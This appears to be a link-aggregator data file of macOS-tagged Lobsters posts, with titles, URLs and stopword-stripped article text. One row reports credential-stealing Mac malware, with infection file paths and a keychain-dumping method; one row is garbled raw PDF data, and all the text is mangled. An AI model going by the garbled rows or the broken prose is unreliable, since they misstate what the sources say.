532,Lobsters,mac,Apple macOS,Running Mac OS X 10.11.6 El Capitan on KVM + QEMU,https://github.com/kholia/OSX-KVM,running mac o x el capitan kvm qemu,note commercial available email commercial support option note contributing back munki requirement installation preparation installation older readme postinstallation networking note enable functionality manually modern ubuntu version note note note gensmbios legal available thought motivation work cracking apple keychains,note readme document new method install macos older readme available new method require existing physicalvirtual macos installation however new method requires internet access macos installation process limitation may addressed future commit note blob resource included repository rederivable instruction included looking commercial support stuff available email chat commercial support option looking big sur support see note contributing back project always use help time attention looking help pullrequests following work item create full installation iso image without requiring existing macos physicalvirtual installation ansible playbook automate allthethings documentation around running macos popular cloud provider gcp aws see legal section associated reference test accelhvf flag qemu macos mojave macbook pro document share use project build test opensource project get stuff done document use project io development document use project xnu kernel debugging development document process create reuse vm snapshot instantaneous macos boot would nice way document process launch bunch headless macos vms build farm document usage munki deploy software build farm enable ssh support box easily better support doc amd ryzen patch unify various script robustness improvement requirement modern linux distribution eg ubuntu lts later qemu cpu intel vtx amd svm support required cpu support required macos sierra cpu support required macos mojave note older amd cpu known problematic amd work phenom ii ryzen processor work fine installation preparation kvm may need following tweak host machine work echo sysmodulekvmparametersignoremsrs make change permanent may use following command sudo cp kvmconf etcmodprobedkvmconf install qemu package sudo aptget install qemu umlutilities virtmanager git wget libguestfstools step may need adapted linux distribution clone repository qemu system file repository used following step cd git clone http githubcomkholiaosxkvmgit cd osxkvm fetch macos installer fetchmacospy choose desired macos version executing step basesystemdmg file current folder sample run fetchmacospy productid version build post date title macos mojave macos mojave macos high sierra macos mojave install macos high sierra beta macos catalina macos catalina macos catalina macos catalina macos catalina macos catalina choose product download attention modern nvidia gpus supported highsierra later version yet next convert file usable format basesystemdmg basesystemimg note also use following command conversion qemu version qemuimg convert basesystemdmg raw basesystemimg create virtual hdd image macos installed change name disk image machddimg something else boot script need updating point new image name qemuimg create f machddngimg setup quick networking running following command sudo ip tuntap add dev mode tap sudo ip link set promisc sudo ip link set dev sudo ip link set dev master note network interface present system may deactivated try enabling using following command virsh netstart default virsh netautostart default ready install macos installation cli method primary run opencorebootsh script start installation proces opencorebootsh new installing macos see older readme help set optional use macos vm disk libvirt virtmanager virsh stuff edit macoslibvirtcatalinaxml file change various file path search changeme string file following command trick usually sed schangeme userg macoslibvirtcatalinaxml virtxmlvalidate macoslibvirtcatalinaxml create vm running following command virsh connect qemu system define macoslibvirtcatalinaxml launch virtmanager start macos virtual machine note may need run sudo ip link delete command virtmanager able start macos vm postinstallation see networking note setup guest networking following command present etcrclocal usrbinenv bash sudo ip tuntap add dev mode tap sudo ip link set promisc sudo ip link set dev sudo ip link set dev master enough far note may need enable rclocal functionality manually modern ubuntu version get sound virtual mac see virtual sound device note passthrough gpus device see note need different resolution check note included repository generate smbios use gensmbios legal secret apple osk string widely available internet also included public court document available lawyer seems apple attempt get osk string treated trade secret work due reason osk string freely included repository gabriel somlo also thought legal aspect involved running macos qemukvm motivation aim enable macos based build testing kernel debugging reversing security task easy reproducible manner without needing invest apple closed ecosystem heavily backstory poor student canada apple made work cracking apple keychains lot harder needed
533,Lobsters,mac,Apple macOS,Homebrew 1.0.0,http://brew.sh/2016/09/21/homebrew-1.0.0/,homebrew,mxcl almost unique contributor widereaching thirdparty tap ecosystem thousand package,today proud announce homebrew seven year since homebrew created mxcl community grown almost unique contributor widereaching thirdparty tap ecosystem thousand package working hard last year make major change homebrew wanting long time hiccup along way stable base using developing homebrew future include finally thanks user contributor maintainer past present getting u milestone enjoy using homebrew
535,Lobsters,mac,Apple macOS,Why the Apple II ProDOS 2.4 Release is the OS News of the Year,http://ascii.textfiles.com/archives/5054,apple ii prodos release o news year,apple ii prodos release o news year talented programmer legacy operating system prodos usbconnectedemulated drive internet archive page thanks john brook inspiration release provides computer history,apple ii prodos release o news year september september talented programmer released cooked update major company legacy operating system purely needed done raft new feature wrapin program bugfixes included release stress done hobby project project understatement simply called prodos update prodos last version released download boot emulator webpage update unto item wonder compatibility repaired entire apple ii line first apple ii apple iigs well case various version cpu like case newer card installed apple ii usbconnectedemulated drive important utility related disk transfer disk inspection program selection joined image footprint smaller run faster predecessor wonder case o upgrade entire list improvement addition fix internet archive page put reason call important operating system update year multifold first pure unique experience upgrade mean see rare example happens computer environment sits tight decade many eye many note experience improved followed someone driven enough go methodically implement request inclusion utility disk mean also benefit aftermarket improvement functionality continuing user environment needed timetested wrapped without disturbing size operating system program like goldstar hall fame apple ii utility packed o inspired choreographed waltz new old unique next operating system upgrade free commercial marketing constraint drive compared say io upgrade trumpet addition search function blare proud announcement broke map google kissed another boy recess window democratic convention riot operating system designed ground compatible variety mobiletablet product way shoved throat current user cajoling insulting methodology misleading optout route freakier freakier fakecountdowns current mainstream o environment frankly horrifying see pure note trumpet clearminded attention efficiency functionality improvement stand testament fact still possible achieve albeit smaller slowermoving target either way inspiration last upgrade valentine community make use platform idea hacker improvement calling back decade amount people upgrade benefit relatively small world number folk still using apple ii tiny enough nearly everybody either know know someone know everyone else route fame resume point get snapped startup game oneupsmanship shoddily slapped together prove point drop beta onto end fig leaf could best called lab experiment gone fridge done sake tool polished made anew nearextinct audience work best ability machine thought last massmarketed computer designed single individual special day indeed doubt remainder top think first month thanks john brook inspiration release provides categorised computer history comment disabled post
536,Lobsters,mac,Apple macOS,MacVim Snapshot 109 - vim 8.0.0003,https://github.com/macvim-dev/macvim/releases/tag/snapshot-109,macvim snapshot vim,reload reload,binary target o x mountain lion maverick yosemite el capitan vim patch script interface compatibility version lua perl ruby perform action time signed another tab window reload refresh session signed another tab window reload refresh session
537,Lobsters,mac,Apple macOS,Weirdly broken wifi access points,http://www.kmjn.org/notes/broken_wifi_access_points.html,weirdly broken wifi access point,failure number one failure number two devolo devolos software,stayed share accommodation questionable internet setup wifi failure b b airbnbs equipped consumerlevel access point nt really work thought share two along workaround one though admittedly pretty janky workaround failure number one one failure regularity oddly satisfying yet also troubling yes every packet dropped completely regular pattern mention remaining half pretty appalling latency nt know caused one fortunately nt stick around long enough find failure number two second become considerably familiar variety broken router periodic dropout every second turn last second overall packet loss range around worse packet lost randomly mind dropout every packet period lost convince software internet stop retrying entirely make stuff fail work rather dealing badquality network high packet loss normal mechanism place deal random packet loss like baked tcp nt deal kind dropout run failure twice building using kind interface powerlinenetworking unit devolo unit fairly common uk many building hastily converted b b type use highspeed internet enter ground floor distribute building powerline networking initially thought powerline networking aspect fault first encountered idea transmitting data slightly modulating electric wiring house seemed pretty fantastical early unit indeed great quality especially prone interference almost kind appliance plugged circuit today unit really quite reliable least regarding powerline portion able figure dropout occurring downloading devolo software yes know rarely expect much kind software indeed great able retrieve map network ip address various component given information simply pinging made obvious dropout powerline portion portion worked perfectly reliably router far end powerline segment supposed route data internet would periodically stop forwarding packet pedestrian failure mode failure exotic powerline networking bad router first time ran failure mode noticed android phone nt kind dropout mac laptop yes disabled mobile data make sure phone nt transparently falling back led suspicion osx something weird distressed router whether really osx fault ala able find anything particular played around thing like mtus based suggestion found internet dead end come suboptimal workaround though based twin observation mac laptop able reliably get internet router android phone tethered laptop phone via bluetooth using phone wifi modem worked although well since android seems forward bluetoothtethered packet quite latency frequently latency second time ran exact problem though kind device figured must better way bluetoothtethering phone experimentation revealed cycling wifi ie going turn wifi immediately turn wifi osx would put back good part cycle manually bit verify worked came following shell script automatically sends burst two ping per second us osx networksetup utility cycle wifi given second ping fail go binsh ping c devnull networksetup setairportpower networksetup setairportpower echo dropout date fi done course tweak threshold resetting sending two ping per second resetting interface fail arbitrary choice experimentation reveals fully cycling wifi nt necessary reset connection working state simply requesting new dhcp lease presumably identifies u new connection reset problematic buffer somewhere router unfortunately mac osx networksetup utility nt provide way request new dhcp lease without cycling wifi entirely even though gui interface system preference friendly folk internet however figured system preference allows u produce following shell script run command run behind scene version script must run root since userlevel commandline tool expose required functionality binsh ping c devnull echo add state temporary scutil echo dropout date fi done script running dropout recovered within second packet loss versus previously low enough stuff work perfectly fine treating occasional dropped packet routine problem solved sort
538,Lobsters,mac,Apple macOS,An OS 9 odyssey: Why these Mac users won’t abandon 16-year-old software,http://arstechnica.com/apple/2016/09/an-os-9-odyssey-why-do-some-mac-users-still-rely-on-16-year-old-software/,o odyssey mac user abandon software,enlarge forced work mac o yet another macos update subreddits facebook group whhhhyyyyyy programmatic hangerson posed question quark tiger wudbaer story mac o still alive using o,enlarge andrew cunningham nt one dabbling o within recent yearsandrew cunningham back ar senior product editor andrew cunningham forced work mac o colleague september quickly hit productivity wall could nt log ar email much anything online someone writes new technology onlineonly could nt work cunningham could play old game marvel difference year make operating system design hard may believe light yet another o x macos update still use apple longabandoned system o diehard may hold due one important task ca nt replicate newer computer perhaps simply prefer daily driver take quick trip world subreddits facebook group verify user exist certain ca nt maniac went searching people trawled forum asked around even spent time classic mac surprise found people cling staunchly mac o earlier key component least actually good reason whhhhyyyyyy reason mac lover stick o practically numerous apple operating system o subscriber hold cost reason computer prohibitively expensive live people would also need spend thousand new software license updated hardware top cost new mac many speak genuine preference o user stick around purely think classic mac o offer pleasant experience o x creatives particular speak o biggest technical shortcoming favorable term nt love way one app crashing would bring entire system rather design element unfortunately lead scenario often better suit creative work alluding specifically way o handle multitasking starting system classic mac o used cooperative multitasking differs preemptive multitasking modern window o x linux classic mac o multitasking want change apps active program relinquish control focus cpu one two thing mean terrible today typical litany active process write sentence apps open imac running multiple process thread addition background syncing four cloud service allowing couple active program classic mac o streamlines workflow closer resemble way people think endless notification frequent app switching cause brain rewire sense o kind middle ground modern distractionheavy computing going analog pen paper typewriter justification represent large mac o user archetype follows testimony several classic mac holdout hundred perhaps thousand people around burn candle classic macintosh operating system given communityled development devotion inspired o might tempt wouldbe user back future programmatic hangerson remembering comment cunningham article littered story people still make made short time beforehand regular use o getting thing done first posed question ar forum regularly us mac o earlier work purpose reader kefkafloyd said rare among customer past several year keep o machine around need various bit aging prepress software old version betterknown program pagemaker run o x classic mode removed tiger though slims pack o holdout publishing business even wudbaer story workplace dedication even older mac o version suggests could classic mac holdout around world even o user incentivized stick preferred o long possible use obscure expensive program useful enough justify effort wudbaers case specific need custom dna synthesis standing way upgrade genius wrote software use interface machine lab management software used network library support machine wrote mean wudbaer colleague need control certain dna synthesizer lab mac via localtalk technology last macintosh model performa powerbook introduced ran system dna synthesis lab two lc iii mac one quadra running hour day seven day lot spare part standby machine ready go needed synthesizer cost around euro back equivalent roughly term want get money worth lab also newer dna synthesizer interface newer computer chemically generate many oligonucleotides short synthetic dna molecule higher throughput come tradeoff however whereas old synthesizer synthesize oligonucleotides independently thereby allowing easy modification additional coupling new one one bulk parallel process meaning extra stuff wait afterward work mean time wudbaer say time money facebook group mac o still alive people trade o endurance story prefer writing environment others keep around bit piece work require expensive software adobe creative suite cad package pro tool specifically open old file created software use old mac game far mac gameshy reputation would story another day scant brave struggle o sort offline task also rely web browsing platform see browse ar mac o thanks classilla one time feeling great andrew cunningham using o really intensely dislike idea ability run facebook sole determining factor whether computer obsolete people read o wikipedia using o day
540,Lobsters,mac,Apple macOS,OS X malware spread via signed Transmission app... again,https://www.grahamcluley.com/2016/09/signed-sealed-delivered-malware-spread-signed-transmission-app/,o x malware spread via signed transmission app,year old explain another blog post keychaindump paper osxkerangera follow graham cluley twitter,article year old researcher caught malware spread signed version transmission popular o x bittorrent client team malware analyst notified transmission malicious file discovered transmission application official website transmission promptly removed file even unclear malware go name osxkeydnap first made onto site eset researcher explain according signature application bundle signed august seems distributed next day thus advise anyone downloaded transmission august august inclusively verify system compromised testing presence following file directory applicationstransmissionappcontentsresourceslicensertf volumestransmissiontransmissionappcontentsresourceslicensertf homelibraryapplication supportcomappleicloudsyncdaemonicloudsyncd homelibraryapplication supportcomappleicloudsyncdaemonprocessid homelibrarylaunchagentscomappleicloudsyncdaemonplist libraryapplication supportcomappleicloudsyncdaemon homelibrarylaunchagentscomgeticloudicloudphotoplist circumstance want find file running computer presence point active keydnap infection mean anything good mac user password eset researcher elaborate another blog post osxkeydnap backdoor equipped mechanism gather exfiltrate password key stored o x keychain author simply took proofofconcept example available github called keychaindump read securityd memory search decryption key user keychain process described paper k lee h koo one reason think source taken directly github function name source code keydnap malware interestingly version osxkeydnap bear striking similarity osxkerangera first fully functional ransomware posed version transmission back march coincidence bloody likely code responsible dropping malware payload osxkeydnap osxkerangera also share c c url resource path parameter well legitimate code signing key signed apple meaning malware sample bypass gatekeeper per eset recommendation installed transmission august august year make sure check presence file remove scan system antivirus solution safe side found article interesting follow graham cluley twitter read exclusive content post david bisson infosec news junkie security journalist work contributing editor graham cluley security news associate editor tripwire state security blog
541,Lobsters,mac,Apple macOS,How AI and Machine Learning Work at Apple,https://backchannel.com/an-exclusive-look-at-how-ai-and-machine-learning-work-at-apple-8dbfb131932b,ai machine learning work apple,july steven levy sign course stanford well earlier month newton made point skynet though apple explaining turi apple snatched probably best measure several ai expert viv probably biggest issue helpful differential privacy wrote book clear machine learning,july siri brain transplantthree year earlier apple first major tech company integrate smart assistant operating system siri company adaptation standalone app purchased along team created initial review ecstatic next month year user became impatient shortcoming often erroneously interpreted command tweak fix itsteven levy founder get backchannel weekly newsletterso apple moved siri voice recognition neuralnet based system u user late july day went worldwide august previous technique remained operational keeping score home includes hidden markov model system leverage machine learning technique including deep neural network dnn convolutional neural network long shortterm memory unit gated recurrent unit ngrams glad asked user made upgrade siri still looked supercharged deep learningas typical underthehood advance may reveal thinking competitor apple publicize development user noticed fewer error fact apple say result improving accuracy stunningsenior vp internet software service eddy cue one thing jump significant test make sure somebody drop decimal place say eddy cue apple senior vice president internet software servicesthis story siri transformation revealed first time might raise eyebrow much artificial intelligence world neural net improved system course would apple quietly adept recently apple hiring ai field stepped company made highprofile acquisition observer viewed apple laggard shaping heated competition industry race best use powerful ai tool apple always tightlipped go behind badged door ai cognoscenti know apple machine learning part community say jerry kaplan teach course stanford history artificial intelligence apple nsa ai ai brahmin figured apple effort significant google facebook would heard google facebook microsoft top people machine learning say oren etzioni allen institute ai yes apple hired people five leader machine learning work apple apple speech recognition clear else machine learning help show product machine learning used missouri say etzioni actually israel show well earlier month apple show machine learning used product etzioni oren please read spent better part day boardroom one infinite loop cupertino headquarters getting core dump company activity ai machine learning top apple executive cue senior worldwide marketing vice president phil schiller senior vice president software engineering craig federighi well two key siri scientist sat handed dense twopage agenda listing machinelearningimbued apple product service one already shipping would discussthe message already player second nonebut wayif iphone user come across apple ai siri improved acumen figuring ask see phone identifies caller contact list email recently swipe screen get shortlist apps likely open next get reminder appointment never got around putting calendar map location pop hotel reserved type phone point parked car even though never asked technique either made possible greatly enhanced apple adoption deep learning neural netsyes apple brain already inside iphoneface recognition apple game neural net machine learning briefers say found apple product service apple us deep learning detect fraud apple store extend battery life charge device help identify useful feedback thousand report beta tester machine learning help apple choose news story determines whether apple watch user exercising simply perambulating recognizes face location photo figure whether would better leaving weak wifi signal switching cell network even know good filmmaking enabling apple quickly compile snapshot video minimovie touch button apple competitor many similar thing say executive none ai power pull thing protecting privacy closely apple course none make apple productsai new apple early using machine learning technique handwriting recognition product remember newton remnant effort still found today product convert handscrawled chinese character text recognize letterbyletter input apple watch user finger scribbling custom message watch face feature produced ml team engineer course earlier day machine learning primitive deep learning even buzzworded yet today ai technique rage apple bristle implication learning comparatively shallow recent week ceo tim cook made point mention company top leader elaboratingthe apple watch us machine learning fitnessrelated apps seeing last five year growth inside apple say phil schiller device getting much smarter quicker rate especially apple design series chip back end getting much smarter faster everything find reason connected enables machine learning technique much stuff learn available u even apple bearhugging machine learning executive caution embrace sense business usual cupertino illuminati view deep learning ml latest steady flow groundbreaking technology yes yes transformational advance like touch screen flat panel objectoriented programming apple view machine learning final frontier despite company say like technology year instrumental changing way interact device say cue one apple want even touch spookyscary speculation invariably come ai discussion expect apple confirm whether working selfdriving car version netflix team made pretty clear apple working skynet use technique thing always wanted better able say schiller new thing able technique ultimately apple way thing evolves inside apple way make product yet briefing unfolds becomes clear much ai already shaped overall experience using apple ecosystem view ai establishment apple constrained lack search engine deliver data help train neural network inflexible insistence protecting user information potentially denies apple data otherwise might use turn apple figured jump hurdleshow big brain dynamic cache enables machine learning iphone somewhat surprise asked apple provided information megabyte depending much personal information stored always deleting older data includes information app usage interaction people neural net processing speech modeler natural language event modeling also data used neural net power object recognition face recognition scene classificationand according apple done preference predilection peregrination privatethough apple explaining everything ai effort manage get resolution company distributes ml expertise around organization company machine learning talent shared throughout entire company available product team encouraged tap solve problem invent feature individual product single centralized organization temple ml apple say craig federighi try keep close team need apply deliver right user experience many people apple working machine learning lot say federighi prodding thought give number know apple interesting apple ml produced many people necessarily trained field joined company hire people smart fundamental domain mathematics statistic programming language cryptography say federighi turn lot kind core talent translate beautifully machine learning though today certainly hire many machine learning people also look people right core aptitude talent left senior vice president software engineering craig federighi listens siri senior director alex acero discus voice recognition software apple headquarters though federighi say approach might necessity apple penchant secrecy put disadvantage competitor encourage star computer scientist widely share research world practice tend reinforce natural selection bias interested working team deliver great product versus whose primary motivation publishing say federighi improving apple product scientist happen make breakthrough field great driven vision end result say cuesome talent field come acquisition recently buying company year relatively small really hiring manpower say cue apple buy ai company say big raw bunch machine learning researcher let build stable say federighi looking people talent really focused delivering great experience recent purchase turi seattle company apple snatched reported million built ml toolkit compared google tensorflow purchase fueled speculation apple would use similar purpose internally developer apple executive confirm deny certain thing matched well apple technology view people point view say cue year two may figure happened siri began showing predictive power cue relation eddy small startup apple snatched matter talent come apple ai infrastructure allows develop product feature would possible earlier mean altering company product road map apple end list really cool idea say schiller machine learning enabling u say yes thing past year would said becoming embedded process deciding product going next one example apple pencil work ipad pro order apple include version hightech stylus deal fact people wrote device bottom hand would invariably brush touch screen causing sort digital havoc using machine learning model palm rejection enabled screen sensor detect difference swipe touch pencil input high degree accuracy work rock solid good piece paper write anymore pencil good product say federighi love pencil thank machine learningprobably best measure apple machine learning progress come important ai acquisition date siri origin came ambitious darpa program intelligent assistant later scientist started company using technology create app steve job convinced founder sell apple directed siri built operating system launch highlight iphone event october working extend beyond instance user invoke holding home button simply uttering word hey siri feature make use machine learning allowing iphone keep ear without draining battery siri intelligence integrated apple brain work even keep mouth shutas far core product concerned cue cite four component product speech recognition understand talk natural language understanding grasp saying execution fulfill query request response talk back machine learning impacted hugely significant way sayssiri advanced development head tom gruber top siri speech guru alex acero siri head advanced development tom gruber came apple along original acquisition cofounder left introduction say even apple applied neural net siri scale user base providing data would key training net later steve said going go overnight pilot app hundred million user without beta program say sudden going user tell people say thing relevant app first revolution neural network came along siri transition neural net handling speech recognition got high gear arrival several ai expert including alex acero head speech team acero began career speech recognition apple early spent many year microsoft research loved published many paper say siri came said chance make deep neural network reality something hundred people read used million word type scientist apple seeking prioritizing product publishingwhen acero arrived three year ago apple still licensing much speech technology siri third party situation due change federighi note pattern apple repeat consistently becomes clear technology area critical ability deliver great product time build inhouse capability deliver experience want make great want innovate internally speech excellent example applied stuff available externally get ground team began training neural net replace siri original biggest baddest gpu graphic processing unit microprocessor farm cranking time say acero pump lot data july release proved cycle vain error rate cut factor two language factor two many case say acero mostly due deep learning way optimized algorithm context whole endtoend product endtoend reference telling apple first company use dnns speech recognition apple make argument control entire delivery system advantage apple make chip acero say able work directly silicon design team engineer write firmware device maximize performance neural net need siri team influenced even aspect iphone design silicon add federighi many microphone put device place microphone tune hardware mics software stack audio processing piece concert incredible advantage versus build software see happens another edge apple neural net work one product become core technology used purpose machine learning help siri understand becomes engine handle dictation instead typing result siri work people find message email likely coherent eschew soft keyboard instead click microphone key talkthe second siri component cue mentioned natural language understanding siri began using ml understand user intent november released version deeper learning year later speech recognition machine learning improved experience especially interpreting command flexibly example cue pull iphone invokes siri send jane twenty dollar square cash say screen display screen reflecting request try using little different language shoot twenty buck wife resultapple say without advance siri unlikely would produced current iteration apple tv distinguished sophisticated voice control earlier version siri forced speak constrained manner superchargedbydeeplearning version deliver specific choice vast catalog movie song also handle concept show good thriller tom hank siri really smart rule da vinci code able offer prior technology say federighiwith io scheduled full release fall siri voice becomes last four component transformed machine learning deep neural network replaced previously licensed implementation essentially siri remark come database recording collected voice center sentence stitchedtogether patchwork chunk machine learning say gruber smooth make siri sound like actual personacero demo first familiar siri voice robotic element become accustomed new one say hi sultry fluency made difference deep learning baby saysthough seems like small detail natural voice siri actually trigger big difference people feel trusting voice bit highquality say gruber better voice actually pull user use increasingreturns effect willingness use siri well improvement made machine learning becomes even important apple finally opening siri developer process apple critic noted long overdue many noted apple whose thirdparty siri partner number double figure way behind system like amazon alexa boast skill provided outsider developer apple say comparison hold amazon user use specific language access skill siri integrate thing like squarecash uber naturally say apple another competitor viv created siri cofounder also promise tight integration asyetunannounced launch date arrives meanwhile apple report improvement siri making difference people discover new feature find success familiar query number request continues grow grow say cue think need better job communicating thing instance love sport ask think going win game come back answer even know probably biggest issue apple adoption machine learning company succeed sticking principle user privacy company encrypts user information one even apple lawyer read fbi even warrant boast collecting user information advertising purposeswhile admirable user perspective apple rigor issue helpful luring top ai talent company machine learning expert want data say former apple employee working aicentric company privacy stance apple basically put one hand behind back argue whether right thing given apple reputation real hardcore ai folk view hotly contested apple executive say possible get data need robust machine learning without keeping profile user cloud even storing instance behavior train neural net false narrative false tradeoff say federighi great would known uniquely respecting user privacy sake user everywhere like show way rest industry get board two issue involved first involves processing personal information machinelearning based system detail user gleaned neuralnet processing happens information second issue involves gathering information required train neuralnets recognize behavior without collecting personal information user apple say answer people perceive thing ai data say cue found way get data need still maintaining privacy bottom line apple handle first issue protecting personal preference information neural net identify taking advantage unique control software hardware put simply personal stuff stay inside apple brain keep sensitive thing ml occurring entirely local device federighi say example cite app suggestion icon appear swipe right ideally exactly apps intended open next prediction based number factor many involving behavior one business work federighi say percent time people find need prediction apple computing right phoneother information apple store device includes probably personal data apple capture word people type using standard iphone quicktype keyboard using neural networktrained system watch type apple detect key event item like flight information contact appointment information stay phone even backup stored apple cloud information distilled way inferred backup alone want information stored apple server say federighi need apple corporation need know habit go apple also try minimize information kept general federighi mention example might conversation someone mention term potential search company might analyze whole conversation cloud identify term say apple device detect without data leave user possession system constantly looking match knowledge base kept phone part megabyte brain compact quite thorough knowledge base hundred thousand location entity localize know say federighi knowledge base tapped apple apps including spotlight search app map safari help autocorrect working continuously background saysthe question come machine learning circle though whether apple privacy restriction hobble neural net algorithm aforementioned second issue neural net need massive amount data sufficiently trained accuracy apple suck user behavior get data many company apple train net publicly available corpus information data set stock image photo recognition instance sometimes need current specific information could come user base apple try get information without knowing user anonymizes data tagging random identifier associated apple idsbeginning io apple also employ relatively new technique called differential privacy basically crowdsources information way identify individual example use might surface newly popular word apple knowledge base vocabulary link suddenly emerge relevant answer query surge usage certain emojis traditional way industry solves problem send every word type every character type server trawl spot interesting thing say federighi endtoend encryption though differential privacy hatched research community apple taking step apply massive scale taking research billion user say cue started working year ago done really interesting work practical scale explains federighi pretty crazy private describes system involves virtual cointossing cryptographic protocol barely could follow wrote book cryptography basically adding mathematical noise certain piece data apple detect usage pattern without identifying individual user say apple contribution sufficiently significant valuable world large authorizing scientist working implementation publish paper workwhile clear machine learning changed apple product clear whether changing apple sense machine learning mindset seems odds apple ethos apple company carefully control user experience sensor measure swipe everything predesigned precisely coded engineer use machine learning must step back let software discover solution apple adjust modern reality machine learning system hand product design source lot internal debate say federighi used delivering wellthoughtout curated experience control dimension system going interact user start training system based large data set human behavior result emerge necessarily apple designer specified emerged data apple turning back say schiller technique absolutely affect design something end day using enable u deliver higher quality product takeaway apple may make declaration going allin machine learning company use much possible improve product brain inside phone proof typical customer going experience deep learning daytoday level exemplifies love apple product say schiller exciting instance subtle even think third time see stop say happening skynet wait
542,Lobsters,mac,Apple macOS,DOS as a Mach 3.0 Application (1991),https://www.usenix.org/legacy/publications/library/proceedings/mach91/malan.pdf,do mach application,,obj endobj xref n n n n n n n n n n n n n n n n n trailer startxref eof obj stream x endstream endobj obj metadata rpages rtypecatalogpagelabels r endobj obj font procset pdftextimageb property extgstate typepage endobj obj endobj obj stream dm eq endstream endobj obj endobj obj endobj obj endobj obj stream l da vl u fa c b b cy f v ӭ p w ht n һ b
543,Lobsters,mac,Apple macOS,"Goodbye Mac OS Forge, hello GitHub",https://lists.macosforge.org/pipermail/macports-dev/2016-August/033405.html,goodbye mac o forge hello github,goodbye mac o forge hello github ryandesign macportsorg information macportsdev mailing list,goodbye mac o forge hello github ryan schmidt ryandesign macportsorg fri aug pdt pleased announce macports moving source code github exact date move yet set message let know change coming soon since apple hosted macports mac o forge service decade since mac o forge created collaborative software development platform like github bitbucket become popular successful hired mac o forge sysadmin last year part job evaluate whether service could suitable replacement offered mac o forge determined answer yes github best choice due overwhelming popularity mac o forge project including xquartz cup calendarserver already process moving github time come macports likewise bid fond farewell mac o forge move macports manager member community discussed change length year several developer asked github perception everybody github developer nt take project seriously github part answer question would pain move mac o forge good enough leave mac o forge anyway make sense convert git take opportunity much needed overdue restructuring splitting repository move github make use great collaboration feature pull request contributor wishing hopefully addition benefit moving github help u attract keep new developer talent january survey list developer indicated preference git happy subversion client github accommodates separate mail follow given much thought way use trac ticket system extensive discussion might able use github issue even performing trial conversion ticket came realization moving github issue would step back u github issue nt custom field use indicate name port affected ticket available workarounds unsatisfactory original author ticket comment preserved importing github issue short converting github issue would lossy also considered converting jira bugzilla end decided staying trac best least disruptive choice migrate data trac installation new server taking opportunity upgrade latest version trac make improvement already completed several step transition earlier year announced started using maxcdn front primary file server distribute file faster earlier month announced new home primary file server friedrichalexander university new buildbot automated build system announced earlier month hosted hardware outside apple need minor change monitor github instead subversion macports domain name already owned project moved namecheap dns move apple namecheap macportsorg email forwarding move new server wwwmacportsorg guidemacportsorg web site move new server retaining functionality apple continue host mailing list transition mostly transparent user separate email sent announcement user list closer time move detailing step user might need take behalf portmgr thanks clemens lang writing macports subversion git conversion rule going use larry velázquez registering macports username github year ago anticipation day thanks former mac o forge sysadmins keith dart henry groen shreeraj karulkar bill siegrist keeping everything running year appreciative humble thanks apple supporting open source software allowing developer create initial version macports release open source software providing hardware network bandwidth host grateful sure question information follow thank bearing u transition information macportsdev mailing list
544,Lobsters,mac,Apple macOS,Removing the PowerShell curl alias?,https://daniel.haxx.se/blog/2016/08/19/removing-the-powershell-curl-alias/,removing powershell curl alias,powershell curl remain pointless powershell open source github yesterday pullrequest asking alias removed,powershell spiced command line shell made microsoft according people really useful good shell alternative already long time ago got bug report confused user use curl powershell prompt take long figured microsoft added alias curl wget alias shell instead invoke command called invokewebrequest whenever curl wget entered invokewebrequest powershell version command line tool fiddling url invokewebrequest course anywhere near similar neither curl wget support command line option anything alias really help user user would want actual curl wget helped alias user know real curl wget use alias remain pointless remained thorn side ever since knowing confusing user every personally since really window guy fast forward modern day microsoft released powershell open source github yesterday without much ado filed pullrequest asking alias removed minuscule line patch took way longer git clone repo make actual patch submit pull request took minute close pull request alias existed multiple release removing would breaking change honest expect merge easily figure added alias reason back day seems unlikely outsider would make change decision like blue story end obviously microsoft people gave pr attention comment added like bring great point added number alias unix command someone installed command window alias screw need fix maybe trigger change anyway story
545,Lobsters,mac,Apple macOS,PowerShell - Linux / OSX binaries + source,https://github.com/PowerShell/PowerShell,powershell linux osx binary source,powershell window powershell v powershell core issue tracked uservoice new powershell getting started get powershell supported community release community dashboard dashboard blog post chat addons library awesome powershell building repository faq build status nightly build downloading source code working powershell repository developing contributing contribution guide check faq powershellrfc repository support support section legal licensing mit license window docker file image telemetry application insight microsoft privacy statement governance microsoft open source code conduct code conduct faq opencode microsoftcom,powershell welcome powershell github community powershell core crossplatform window linux macos automation configuration toolframework work well existing tool optimized dealing structured data eg json csv xml etc rest apis object model includes commandline shell associated scripting language framework processing cmdlets window powershell v powershell core although repository started fork window powershell code base change made repository make way back window powershell automatically also mean issue tracked powershell core higher window powershell specific issue opened uservoice new powershell new powershell would like learn recommend reviewing getting started documentation get powershell download install powershell package following platform download install powershell package following platform supported community also download powershell binary archive window macos linux install specific version visit release community dashboard dashboard visualization community contribution project status using powershell azure powerbi information built dashboard check blog post chat want chat member powershell community gitter room join also communitydriven powershell virtual user group join addons library awesome powershell great curated list addons resource building repository problem building please consult developer faq build status nightly build azure ci window azure ci linux azure ci macos code coverage status codefactor grade downloading source code clone repository git clone http githubcompowershellpowershellgit see working powershell repository information developing contributing please see contribution guide develop contribute developing net core c application targeting powershell core please check faq learn powershell sdk nuget package also make sure check powershellrfc repository requestforcomments rfc document submit give comment proposed future design support support please see support section legal licensing powershell licensed mit license window docker file image license requesting using container o image window container acknowledge understand consent supplemental license term available docker hub telemetry default powershell collect o description version powershell equivalent psversiontableos psversiontablegitcommitid using application insight optout sending telemetry create environment variable called powershelltelemetryoptout set value starting powershell installed location telemetry collect fall microsoft privacy statement governance governance policy powershell project described project adopted microsoft open source code conduct information see code conduct faq contact opencode microsoftcom additional question comment
546,Lobsters,mac,Apple macOS,How a malware can infects digitally signed files without altering hashes on macOS,https://twitter.com/pwnsdx/status/765829369357037570,malware infects digitally signed file without altering hash macos,,detected javascript disabled browser would like proceed legacy twitter yes
